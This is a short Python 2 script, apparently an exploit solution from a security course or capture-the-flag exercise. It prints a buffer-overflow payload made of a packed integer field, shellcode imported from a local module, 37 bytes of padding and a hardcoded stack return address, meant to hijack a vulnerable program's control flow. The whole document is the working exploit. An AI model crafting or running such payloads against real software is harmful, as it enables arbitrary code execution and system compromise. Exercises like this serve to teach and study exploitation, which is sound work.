from struct import pack
from shellcode import shellcode

print pack("<I",0x40000000)+shellcode+"a"*37+pack("<I",0xbffea1b0)
